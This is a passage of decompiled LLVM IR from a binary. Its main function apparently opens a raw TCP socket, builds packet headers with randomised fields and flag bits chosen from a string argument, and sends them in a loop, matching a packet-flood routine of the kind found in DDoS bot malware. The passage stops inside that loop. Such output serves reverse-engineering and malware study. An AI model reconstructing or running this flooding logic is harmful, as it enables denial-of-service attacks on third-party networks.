  uselistorder i32 %v0_d24c, { 1, 0 }
  uselistorder i32 %v3_d244, { 1, 0 }
  uselistorder i32 %v1_d238, { 1, 0 }
  uselistorder i32 %v3_d22c, { 1, 0 }
  uselistorder i32 %v3_d1b8, { 8, 6, 4, 7, 5, 2, 3, 13, 12, 11, 10, 9, 1, 0 }
  uselistorder i32 %v1_d188, { 1, 0 }
  uselistorder i32 %v1_d140, { 1, 0 }
  uselistorder i32 %v1_d088, { 1, 0 }
  uselistorder i32 %v3_d000, { 1, 0 }
  uselistorder i32 %stack_var_-104.0, { 0, 2, 1 }
  uselistorder i32 %v2_cfec, { 1, 0, 2 }
  uselistorder i32 %v1_cf9c, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v2_cf40, { 1, 0, 2 }
  uselistorder i32 %v3_cf04, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-80, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 6, 7, 4, 5, 11, 8, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 20, 23, 24, 21, 22, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 36, 34, 37, 39, 38, 40, 41, 45, 42, 43, 44, 1, 47, 46, 48, 50, 49, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 63, 62, 64, 65, 66, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 0 }
  uselistorder i32 ()* @function_12d1c, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg4, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %arg2, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder label %dec_label_pc_d4ac, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_d3d0, { 1, 0 }
  uselistorder label %dec_label_pc_d2ac, { 1, 0 }
  uselistorder label %dec_label_pc_d184, { 1, 0 }
  uselistorder label %dec_label_pc_d108, { 1, 0 }
  uselistorder label %dec_label_pc_d060, { 1, 0 }
  uselistorder label %dec_label_pc_cf20, { 1, 0 }
}

define i32 @function_d4b4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_d4b4:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_d4b8 = load i32, i32* @r4, align 4
  %v6_d4b8 = load i32, i32* @fp, align 4
  store i32 54464, i32* %stack_var_-4, align 4
  %v2_d4bc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_d4bc, i32* @fp, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_d4f8 = icmp eq i32 %arg2, 0
  br i1 %v2_d4f8, label %dec_label_pc_d500, label %dec_label_pc_d520

dec_label_pc_d500:                                ; preds = %dec_label_pc_d4b4
  %v0_d500 = call i32 @function_8400()
  %v3_d508 = mul i32 %v0_d500, 65536
  store i32 %v3_d508, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d544

dec_label_pc_d520:                                ; preds = %dec_label_pc_d4b4
  %v3_d528 = urem i32 %arg2, 65536
  store i32 %v3_d528, i32* %r3.global-to-local, align 4
  %v1_d530 = call i32 @function_12434(i32 %v3_d528)
  br label %dec_label_pc_d544

dec_label_pc_d544:                                ; preds = %dec_label_pc_d500, %dec_label_pc_d520
  %v2_d548 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_d548, i32* %r3.global-to-local, align 4
  %v3_d554 = call i32 @function_9680(i32 %arg1, i32* nonnull %stack_var_-60)
  store i32 %v3_d554, i32* %r3.global-to-local, align 4
  %v2_d55c = icmp eq i32 %v3_d554, 0
  br i1 %v2_d55c, label %dec_label_pc_d568, label %dec_label_pc_db18

dec_label_pc_d568:                                ; preds = %dec_label_pc_d544
  %v2_d568 = ptrtoint i32* %stack_var_-64 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_d58c = call i32 @function_1263c(i32 2, i32 3, i32 6)
  store i32 %v3_d58c, i32* %r3.global-to-local, align 4
  %v2_d59c = icmp eq i32 %v3_d58c, 0
  br i1 %v2_d59c, label %dec_label_pc_db18, label %dec_label_pc_d5a8

dec_label_pc_d5a8:                                ; preds = %dec_label_pc_d568
  store i32 1, i32* %stack_var_-68, align 4
  %v2_d5b0 = ptrtoint i32* %stack_var_-68 to i32
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_d5b0, i32* %r3.global-to-local, align 4
  %v6_d5cc = call i32 @function_1260c(i32 %v3_d58c, i32 0, i32 3, i32* nonnull %stack_var_-68, i32 4)
  store i32 %v6_d5cc, i32* %r3.global-to-local, align 4
  %v1_d5d4 = icmp slt i32 %v6_d5cc, 0
  br i1 %v1_d5d4, label %dec_label_pc_db18, label %dec_label_pc_d5e0

dec_label_pc_d5e0:                                ; preds = %dec_label_pc_d5a8
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v2_d5e4 = icmp eq i32 %arg4, 0
  br i1 %v2_d5e4, label %dec_label_pc_d610, label %dec_label_pc_d5f8

dec_label_pc_d5f8:                                ; preds = %dec_label_pc_d5e0
  %v1_d5fc = sub i32 32, %arg4
  store i32 %v1_d5fc, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_d608 = shl i32 -1, %v1_d5fc
  br label %dec_label_pc_d610

dec_label_pc_d610:                                ; preds = %dec_label_pc_d5e0, %dec_label_pc_d5f8
  %storemerge10 = phi i32 [ %v1_d608, %dec_label_pc_d5f8 ], [ 0, %dec_label_pc_d5e0 ]
  %v1_d614 = add i32 %arg6, 40
  %v1_d624 = add i32 %arg6, 46
  %v3_d628 = and i32 %v1_d624, -4
  %v1_d630 = load i32, i32* @sp, align 4
  %v2_d630 = sub i32 %v1_d630, %v3_d628
  %v1_d640 = add i32 %v2_d630, 11
  %v3_d644 = and i32 %v1_d640, -4
  store i32 %v3_d644, i32* %r2.global-to-local, align 4
  %v1_d664 = add i32 %v3_d644, 20
  store i32 %v1_d664, i32* %r3.global-to-local, align 4
  %v5_d668 = inttoptr i32 %v1_d664 to i8*
  %v3_d66c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_d66c, i32* @r4, align 4
  %v1_d674 = call i32 @function_aa9c(i32 %storemerge10)
  store i32 %v1_d674, i32* %r3.global-to-local, align 4
  %v1_d680 = call i32 @function_12410(i32 %v1_d674)
  store i32 %v1_d680, i32* %r2.global-to-local, align 4
  %v1_d68c = add i32 %arg6, 20
  %v1_d690 = load i32, i32* @sp, align 4
  %v2_d690 = inttoptr i32 %v1_d690 to i32*
  store i32 %v1_d68c, i32* %v2_d690, align 4
  %v0_d698 = load i32, i32* @r4, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v4_d6a0 = inttoptr i32 %v3_d644 to i8*
  %v5_d6a0 = call i32 @function_ad64(i8* %v4_d6a0, i32 %v0_d698, i32 %v1_d680, i32 6)
  %v0_d6a4 = call i32 @function_8400()
  %v3_d6b0 = urem i32 %v0_d6a4, 65536
  store i32 %v3_d6b0, i32* %r3.global-to-local, align 4
  store i32 %v1_d664, i32* %r2.global-to-local, align 4
  %v1_d6b8 = trunc i32 %v0_d6a4 to i8
  store i8 %v1_d6b8, i8* %v5_d668, align 4
  %v0_d6bc = load i32, i32* %r3.global-to-local, align 4
  %v3_d6bc = sdiv i32 %v0_d6bc, 256
  store i32 %v3_d6bc, i32* %r3.global-to-local, align 4
  %v1_d6c0 = trunc i32 %v3_d6bc to i8
  %v2_d6c0 = load i32, i32* %r2.global-to-local, align 4
  %v3_d6c0 = add i32 %v2_d6c0, 1
  %v4_d6c0 = inttoptr i32 %v3_d6c0 to i8*
  store i8 %v1_d6c0, i8* %v4_d6c0, align 1
  %v0_d6c4 = call i32 @function_8400()
  %v2_d6d0 = add i32 %v3_d644, 24
  %v3_d6d0 = inttoptr i32 %v2_d6d0 to i32*
  store i32 %v0_d6c4, i32* %v3_d6d0, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_d6dc = add i32 %v3_d644, 28
  %v3_d6dc = inttoptr i32 %v2_d6dc to i32*
  store i32 0, i32* %v3_d6dc, align 4
  store i32 %v1_d664, i32* %r2.global-to-local, align 4
  %v1_d6e4 = add i32 %v3_d644, 32
  %v2_d6e4 = inttoptr i32 %v1_d6e4 to i8*
  %v3_d6e4 = load i8, i8* %v2_d6e4, align 4
  %v1_d6f0 = urem i8 %v3_d6e4, 16
  %v1_d6f4 = or i8 %v1_d6f0, 80
  store i8 %v1_d6f4, i8* %v2_d6e4, align 4
  %v3_d704 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_d704, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_16d80.112 to i32), i32* @r1, align 4
  %v3_d710 = inttoptr i32 %v3_d704 to i8*
  %v4_d710 = call i32 @function_11e10(i8* %v3_d710, i32 ptrtoint ([4 x i8]* @global_var_16d80.112 to i32))
  store i32 %v4_d710, i32* %r3.global-to-local, align 4
  %v2_d718 = icmp eq i32 %v4_d710, 0
  br i1 %v2_d718, label %dec_label_pc_d720, label %dec_label_pc_d774

dec_label_pc_d720:                                ; preds = %dec_label_pc_d610
  store i32 %v1_d664, i32* %r2.global-to-local, align 4
  %v1_d724 = add i32 %v3_d644, 33
  %v2_d724 = inttoptr i32 %v1_d724 to i8*
  %v3_d724 = load i8, i8* %v2_d724, align 1
  %v4_d724 = zext i8 %v3_d724 to i32
  %v1_d728 = or i32 %v4_d724, 2
  store i32 %v1_d728, i32* %r3.global-to-local, align 4
  %v1_d72c = trunc i32 %v1_d728 to i8
  store i8 %v1_d72c, i8* %v2_d724, align 1
  store i32 %v1_d664, i32* %r2.global-to-local, align 4
  %v3_d734 = load i8, i8* %v2_d724, align 1
  %v4_d734 = zext i8 %v3_d734 to i32
  %v1_d738 = or i32 %v4_d734, 4
  store i32 %v1_d738, i32* %r3.global-to-local, align 4
  %v1_d73c = trunc i32 %v1_d738 to i8
  store i8 %v1_d73c, i8* %v2_d724, align 1
  store i32 %v1_d664, i32* %r2.global-to-local, align 4
  %v3_d744 = load i8, i8* %v2_d724, align 1
  %v4_d744 = zext i8 %v3_d744 to i32
  %v1_d748 = or i32 %v4_d744, 1
  store i32 %v1_d748, i32* %r3.global-to-local, align 4
  %v1_d74c = trunc i32 %v1_d748 to i8
  store i8 %v1_d74c, i8* %v2_d724, align 1
  store i32 %v1_d664, i32* %r2.global-to-local, align 4
  %v3_d754 = load i8, i8* %v2_d724, align 1
  %v4_d754 = zext i8 %v3_d754 to i32
  %v1_d758 = or i32 %v4_d754, 16
  store i32 %v1_d758, i32* %r3.global-to-local, align 4
  %v1_d75c = trunc i32 %v1_d758 to i8
  store i8 %v1_d75c, i8* %v2_d724, align 1
  store i32 %v1_d664, i32* %r2.global-to-local, align 4
  %v3_d764 = load i8, i8* %v2_d724, align 1
  %v4_d764 = zext i8 %v3_d764 to i32
  %v1_d768 = or i32 %v4_d764, 8
  store i32 %v1_d768, i32* %r3.global-to-local, align 4
  %v1_d76c = trunc i32 %v1_d768 to i8
  store i8 %v1_d76c, i8* %v2_d724, align 1
  br label %dec_label_pc_d8b8

dec_label_pc_d774:                                ; preds = %dec_label_pc_d610
  %v3_d774 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_d774, i32* %r3.global-to-local, align 4
  store i32 %v3_d774, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_16d84.114 to i32), i32* @r1, align 4
  %v2_d780 = call i32 @function_12340(i32 %v3_d774, i32 ptrtoint (i32* @global_var_16d84.114 to i32))
  store i32 %v2_d780, i32* %r3.global-to-local, align 4
  %v2_d8b020 = icmp eq i32 %v2_d780, 0
  br i1 %v2_d8b020, label %dec_label_pc_d8b8, label %dec_label_pc_d790.lr.ph

dec_label_pc_d790.lr.ph:                          ; preds = %dec_label_pc_d774
  %v1_d7b0 = add i32 %v3_d644, 33
  %v2_d7b0 = inttoptr i32 %v1_d7b0 to i8*
  br label %dec_label_pc_d790

dec_label_pc_d790:                                ; preds = %dec_label_pc_d790.lr.ph, %dec_label_pc_d898
  %storemerge1421 = phi i32 [ %v2_d780, %dec_label_pc_d790.lr.ph ], [ %v2_d8a0, %dec_label_pc_d898 ]
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_16d88.116 to i32), i32* @r1, align 4
  %v3_d79c = inttoptr i32 %storemerge1421 to i8*
  %v4_d79c = call i32 @function_11e10(i8* %v3_d79c, i32 ptrtoint ([4 x i8]* @global_var_16d88.116 to i32))
  store i32 %v4_d79c, i32* %r3.global-to-local, align 4
  %v2_d7a4 = icmp eq i32 %v4_d79c, 0
  br i1 %v2_d7a4, label %dec_label_pc_d7ac, label %dec_label_pc_d7c0

dec_label_pc_d7ac:                                ; preds = %dec_label_pc_d790
  store i32 %v1_d664, i32* %r2.global-to-local, align 4
  %v3_d7b0 = load i8, i8* %v2_d7b0, align 1
  %v4_d7b0 = zext i8 %v3_d7b0 to i32
  %v1_d7b4 = or i32 %v4_d7b0, 2
  store i32 %v1_d7b4, i32* %r3.global-to-local, align 4
  %v1_d7b8 = trunc i32 %v1_d7b4 to i8
  store i8 %v1_d7b8, i8* %v2_d7b0, align 1
  br label %dec_label_pc_d898

dec_label_pc_d7c0:                                ; preds = %dec_label_pc_d790
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_16d8c.118 to i32), i32* @r1, align 4
  %v4_d7cc = call i32 @function_11e10(i8* %v3_d79c, i32 ptrtoint ([4 x i8]* @global_var_16d8c.118 to i32))
  store i32 %v4_d7cc, i32* %r3.global-to-local, align 4
  %v2_d7d4 = icmp eq i32 %v4_d7cc, 0
  br i1 %v2_d7d4, label %dec_label_pc_d7dc, label %dec_label_pc_d7f0

dec_label_pc_d7dc:                                ; preds = %dec_label_pc_d7c0
  store i32 %v1_d664, i32* %r2.global-to-local, align 4
  %v3_d7e0 = load i8, i8* %v2_d7b0, align 1
  %v4_d7e0 = zext i8 %v3_d7e0 to i32
  %v1_d7e4 = or i32 %v4_d7e0, 4
  store i32 %v1_d7e4, i32* %r3.global-to-local, align 4
  %v1_d7e8 = trunc i32 %v1_d7e4 to i8
  store i8 %v1_d7e8, i8* %v2_d7b0, align 1
  br label %dec_label_pc_d898

dec_label_pc_d7f0:                                ; preds = %dec_label_pc_d7c0
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_16d90.120 to i32), i32* @r1, align 4
  %v4_d7fc = call i32 @function_11e10(i8* %v3_d79c, i32 ptrtoint ([4 x i8]* @global_var_16d90.120 to i32))
  store i32 %v4_d7fc, i32* %r3.global-to-local, align 4
  %v2_d804 = icmp eq i32 %v4_d7fc, 0
  br i1 %v2_d804, label %dec_label_pc_d80c, label %dec_label_pc_d820

dec_label_pc_d80c:                                ; preds = %dec_label_pc_d7f0
  store i32 %v1_d664, i32* %r2.global-to-local, align 4
  %v3_d810 = load i8, i8* %v2_d7b0, align 1
  %v4_d810 = zext i8 %v3_d810 to i32
  %v1_d814 = or i32 %v4_d810, 1
  store i32 %v1_d814, i32* %r3.global-to-local, align 4
  %v1_d818 = trunc i32 %v1_d814 to i8
  store i8 %v1_d818, i8* %v2_d7b0, align 1
  br label %dec_label_pc_d898

dec_label_pc_d820:                                ; preds = %dec_label_pc_d7f0
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_16d94.122 to i32), i32* @r1, align 4
  %v4_d82c = call i32 @function_11e10(i8* %v3_d79c, i32 ptrtoint ([4 x i8]* @global_var_16d94.122 to i32))
  store i32 %v4_d82c, i32* %r3.global-to-local, align 4
  %v2_d834 = icmp eq i32 %v4_d82c, 0
  br i1 %v2_d834, label %dec_label_pc_d83c, label %dec_label_pc_d850

dec_label_pc_d83c:                                ; preds = %dec_label_pc_d820
  store i32 %v1_d664, i32* %r2.global-to-local, align 4
  %v3_d840 = load i8, i8* %v2_d7b0, align 1
  %v4_d840 = zext i8 %v3_d840 to i32
  %v1_d844 = or i32 %v4_d840, 16
  store i32 %v1_d844, i32* %r3.global-to-local, align 4
  %v1_d848 = trunc i32 %v1_d844 to i8
  store i8 %v1_d848, i8* %v2_d7b0, align 1
  br label %dec_label_pc_d898

dec_label_pc_d850:                                ; preds = %dec_label_pc_d820
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_16d98.124 to i32), i32* @r1, align 4
  %v4_d85c = call i32 @function_11e10(i8* %v3_d79c, i32 ptrtoint ([4 x i8]* @global_var_16d98.124 to i32))
  store i32 %v4_d85c, i32* %r3.global-to-local, align 4
  %v2_d864 = icmp eq i32 %v4_d85c, 0
  br i1 %v2_d864, label %dec_label_pc_d86c, label %dec_label_pc_d880

dec_label_pc_d86c:                                ; preds = %dec_label_pc_d850
  store i32 %v1_d664, i32* %r2.global-to-local, align 4
  %v3_d870 = load i8, i8* %v2_d7b0, align 1
  %v4_d870 = zext i8 %v3_d870 to i32
  %v1_d874 = or i32 %v4_d870, 8
  store i32 %v1_d874, i32* %r3.global-to-local, align 4
  %v1_d878 = trunc i32 %v1_d874 to i8
  store i8 %v1_d878, i8* %v2_d7b0, align 1
  br label %dec_label_pc_d898

dec_label_pc_d880:                                ; preds = %dec_label_pc_d850
  %v2_d884 = load i32, i32* @global_var_205d0.63, align 4
  store i32 %v2_d884, i32* %r3.global-to-local, align 4
  store i32 %storemerge1421, i32* @r2, align 4
  %v3_d894 = call i32 @function_8eb4(i32 %v2_d884, i32 ptrtoint ([18 x i8]* @global_var_16d9c.127 to i32))
  br label %dec_label_pc_d898

dec_label_pc_d898:                                ; preds = %dec_label_pc_d86c, %dec_label_pc_d83c, %dec_label_pc_d80c, %dec_label_pc_d7dc, %dec_label_pc_d7ac, %dec_label_pc_d880
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_16d84.114 to i32), i32* @r1, align 4
  %v2_d8a0 = call i32 @function_12340(i32 0, i32 ptrtoint (i32* @global_var_16d84.114 to i32))
  store i32 %v2_d8a0, i32* %r3.global-to-local, align 4
  %v2_d8b0 = icmp eq i32 %v2_d8a0, 0
  br i1 %v2_d8b0, label %dec_label_pc_d8b8, label %dec_label_pc_d790

dec_label_pc_d8b8:                                ; preds = %dec_label_pc_d898, %dec_label_pc_d774, %dec_label_pc_d720
  %v0_d8b8 = call i32 @function_8400()
  %v3_d8c4 = urem i32 %v0_d8b8, 65536
  store i32 %v3_d8c4, i32* %r3.global-to-local, align 4
  store i32 %v1_d664, i32* %r2.global-to-local, align 4
  %v1_d8cc = trunc i32 %v0_d8b8 to i8
  %v3_d8cc = add i32 %v3_d644, 34
  %v4_d8cc = inttoptr i32 %v3_d8cc to i8*
  store i8 %v1_d8cc, i8* %v4_d8cc, align 2
  %v0_d8d0 = load i32, i32* %r3.global-to-local, align 4
  %v3_d8d025 = udiv i32 %v0_d8d0, 256
  %v1_d8d4 = trunc i32 %v3_d8d025 to i8
  %v2_d8d4 = load i32, i32* %r2.global-to-local, align 4
  %v3_d8d4 = add i32 %v2_d8d4, 15
  %v4_d8d4 = inttoptr i32 %v3_d8d4 to i8*
  store i8 %v1_d8d4, i8* %v4_d8d4, align 1
  store i32 %v1_d664, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_d8e0 = add i32 %v3_d644, 36
  %v4_d8e0 = inttoptr i32 %v3_d8e0 to i8*
  store i8 0, i8* %v4_d8e0, align 4
  %v0_d8e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_d8e4 = trunc i32 %v0_d8e4 to i8
  %v2_d8e4 = load i32, i32* %r2.global-to-local, align 4
  %v3_d8e4 = add i32 %v2_d8e4, 17
  %v4_d8e4 = inttoptr i32 %v3_d8e4 to i8*
  store i8 %v1_d8e4, i8* %v4_d8e4, align 1
  store i32 %v1_d664, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_d8f0 = add i32 %v3_d644, 38
  %v4_d8f0 = inttoptr i32 %v3_d8f0 to i8*
  store i8 0, i8* %v4_d8f0, align 2
  %v0_d8f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_d8f4 = trunc i32 %v0_d8f4 to i8
  %v2_d8f4 = load i32, i32* %r2.global-to-local, align 4
  %v3_d8f4 = add i32 %v2_d8f4, 19
  %v4_d8f4 = inttoptr i32 %v3_d8f4 to i8*
  store i8 %v1_d8f4, i8* %v4_d8f4, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_d4f8, label %dec_label_pc_d904, label %dec_label_pc_d91c

dec_label_pc_d904:                                ; preds = %dec_label_pc_d8b8
  %v0_d904 = call i32 @function_8400()
  %v3_d90c = mul i32 %v0_d904, 65536
  store i32 %v3_d90c, i32* %r3.global-to-local, align 4
  %extract.t = trunc i32 %v0_d904 to i8
  br label %dec_label_pc_d938

dec_label_pc_d91c:                                ; preds = %dec_label_pc_d8b8
  %v3_d924 = urem i32 %arg2, 65536
  store i32 %v3_d924, i32* %r3.global-to-local, align 4
  %v1_d92c = call i32 @function_12434(i32 %v3_d924)
  %extract.t71 = trunc i32 %v1_d92c to i8
  br label %dec_label_pc_d938

dec_label_pc_d938:                                ; preds = %dec_label_pc_d904, %dec_label_pc_d91c
  %v0_d904.sink.off0 = phi i8 [ %extract.t, %dec_label_pc_d904 ], [ %extract.t71, %dec_label_pc_d91c ]
  store i32 %v1_d664, i32* %r2.global-to-local, align 4
  %v4_d93c = sext i8 %v0_d904.sink.off0 to i32
  %v3_d940 = add i32 %v3_d644, 22
  %v4_d940 = inttoptr i32 %v3_d940 to i8*
  store i8 %v0_d904.sink.off0, i8* %v4_d940, align 2
  %v3_d948 = sdiv i32 %v4_d93c, 256
  %v4_d948 = trunc i32 %v3_d948 to i8
  store i32 %v3_d948, i32* %r3.global-to-local, align 4
  %v4_d94c = add i32 %v3_d644, 23
  %v5_d94c = inttoptr i32 %v4_d94c to i8*
  store i8 %v4_d948, i8* %v5_d94c, align 1
  %v5_d958 = call i32 @function_ac54(i32 %v3_d644, i32 %v1_d664, i32 %v1_d664, i32 %v3_d948)
  %sext = mul i32 %v5_d958, 16777216
  %v1_d95c = sdiv i32 %sext, 16777216
  store i32 %v1_d95c, i32* %r3.global-to-local, align 4
  store i32 %v1_d664, i32* %r2.global-to-local, align 4
  %v1_d964 = trunc i32 %v1_d95c to i8
  store i8 %v1_d964, i8* %v4_d8e0, align 4
  %v0_d968 = load i32, i32* %r3.global-to-local, align 4
  %v3_d96828 = udiv i32 %v0_d968, 256
  %v1_d96c = trunc i32 %v3_d96828 to i8
  %v2_d96c = load i32, i32* %r2.global-to-local, align 4
  %v3_d96c = add i32 %v2_d96c, 17
  %v4_d96c = inttoptr i32 %v3_d96c to i8*
  store i8 %v1_d96c, i8* %v4_d96c, align 1
  %v1_d97c = or i32 %v3_d644, 2
  store i32 %v1_d97c, i32* %r3.global-to-local, align 4
  %v1_d980 = inttoptr i32 %v1_d97c to i8*
  %v2_d980 = load i8, i8* %v1_d980, align 2
  %v3_d980 = zext i8 %v2_d980 to i32
  store i32 %v3_d980, i32* %r2.global-to-local, align 4
  %v1_d984 = or i32 %v1_d640, 3
  %v2_d984 = inttoptr i32 %v1_d984 to i8*
  %v3_d984 = load i8, i8* %v2_d984, align 1
  %v4_d984 = zext i8 %v3_d984 to i32
  %v4_d988 = mul nuw nsw i32 %v4_d984, 256
  %v5_d988 = or i32 %v4_d988, %v3_d980
  store i32 %v5_d988, i32* %r3.global-to-local, align 4
  %v3_d994 = call i32 @function_aafc(i8* %v4_d6a0, i32 %v5_d988)
  %sext4 = mul i32 %v3_d994, 16777216
  %v1_d998 = sdiv i32 %sext4, 16777216
  store i32 %v1_d998, i32* %r3.global-to-local, align 4
  store i32 %v3_d644, i32* %r2.global-to-local, align 4
  %v1_d9a0 = trunc i32 %v1_d998 to i8
  %v3_d9a0 = add i32 %v3_d644, 10
  %v4_d9a0 = inttoptr i32 %v3_d9a0 to i8*
  store i8 %v1_d9a0, i8* %v4_d9a0, align 2
  %v0_d9a4 = load i32, i32* %r3.global-to-local, align 4
  %v3_d9a4 = sdiv i32 %v0_d9a4, 256
  store i32 %v3_d9a4, i32* %r3.global-to-local, align 4
  %v1_d9a8 = trunc i32 %v3_d9a4 to i8
  %v2_d9a8 = load i32, i32* %r2.global-to-local, align 4
  %v3_d9a8 = add i32 %v2_d9a8, 11
  %v4_d9a8 = inttoptr i32 %v3_d9a8 to i8*
  store i8 %v1_d9a8, i8* %v4_d9a8, align 1
  %v2_d9b0 = call i32 @function_1096c(i32* null)
  %v2_d9bc = add i32 %v2_d9b0, %arg3
  store i32 %v2_d9bc, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_da14 = add i32 %v3_d644, 12
  %v3_da14 = inttoptr i32 %v2_da14 to i32*
  %v3_da2c = add i32 %v3_d644, 4
  %v4_da2c = inttoptr i32 %v3_da2c to i8*
  %v4_da74 = add i32 %v3_d644, 37
  %v5_da74 = inttoptr i32 %v4_da74 to i8*
  br label %dec_label_pc_d9d0

dec_label_pc_d9d0:                                ; preds = %dec_label_pc_db08, %dec_label_pc_dafc, %dec_label_pc_d938
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_d938 ], [ 0, %dec_label_pc_dafc ], [ %v1_db0c, %dec_label_pc_db08 ]
  store i32 %v3_d644, i32* %r2.global-to-local, align 4
  %v1_d9d8 = load i32, i32* @sp, align 4
  %v2_d9d8 = inttoptr i32 %v1_d9d8 to i32*
  store i32 %v2_d568, i32* %v2_d9d8, align 4
  %v1_d9e0 = load i32, i32* @sp, align 4
  %v2_d9e0 = add i32 %v1_d9e0, 4
  %v3_d9e0 = inttoptr i32 %v2_d9e0 to i32*
  store i32 16, i32* %v3_d9e0, align 4
  %v0_d9e8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_d614, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_d9f4 = inttoptr i32 %v0_d9e8 to i32*
  %v7_d9f4 = call i32 @function_125d8(i32 %v3_d58c, i32* %v6_d9f4, i32 %v1_d614, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_d9fc = call i32 @function_aa9c(i32 %storemerge10)
  store i32 %v1_d9fc, i32* %r3.global-to-local, align 4
  %v1_da08 = call i32 @function_12410(i32 %v1_d9fc)
  store i32 %v1_da08, i32* %r2.global-to-local, align 4
  store i32 %v3_d644, i32* %r3.global-to-local, align 4
  store i32 %v1_da08, i32* %v3_da14, align 4
  %v0_da18 = call i32 @function_8400()
  %v3_da24 = urem i32 %v0_da18, 65536
  store i32 %v3_da24, i32* %r3.global-to-local, align 4
  store i32 %v3_d644, i32* %r2.global-to-local, align 4
  %v1_da2c = trunc i32 %v0_da18 to i8
  store i8 %v1_da2c, i8* %v4_da2c, align 4
  %v0_da30 = load i32, i32* %r3.global-to-local, align 4
  %v3_da30 = sdiv i32 %v0_da30, 256
  store i32 %v3_da30, i32* %r3.global-to-local, align 4
  %v1_da34 = trunc i32 %v3_da30 to i8
  %v2_da34 = load i32, i32* %r2.global-to-local, align 4
  %v3_da34 = add i32 %v2_da34, 5
  %v4_da34 = inttoptr i32 %v3_da34 to i8*
  store i8 %v1_da34, i8* %v4_da34, align 1
  %v0_da38 = call i32 @function_8400()
  store i32 %v0_da38, i32* %r2.global-to-local, align 4
  store i32 %v1_d664, i32* %r3.global-to-local, align 4
  store i32 %v0_da38, i32* %v3_d6d0, align 4
  %v0_da48 = call i32 @function_8400()
  %v3_da54 = urem i32 %v0_da48, 65536
  store i32 %v3_da54, i32* %r3.global-to-local, align 4
  store i32 %v1_d664, i32* %r2.global-to-local, align 4
  %v1_da5c = trunc i32 %v0_da48 to i8
  store i8 %v1_da5c, i8* %v5_d668, align 4
  %v0_da60 = load i32, i32* %r3.global-to-local, align 4
  %v3_da6029 = udiv i32 %v0_da60, 256
  %v1_da64 = trunc i32 %v3_da6029 to i8
  %v2_da64 = load i32, i32* %r2.global-to-local, align 4
  %v3_da64 = add i32 %v2_da64, 1
  %v4_da64 = inttoptr i32 %v3_da64 to i8*
  store i8 %v1_da64, i8* %v4_da64, align 1
  store i32 %v1_d664, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v4_d8e0, align 4
  store i8 0, i8* %v5_da74, align 1
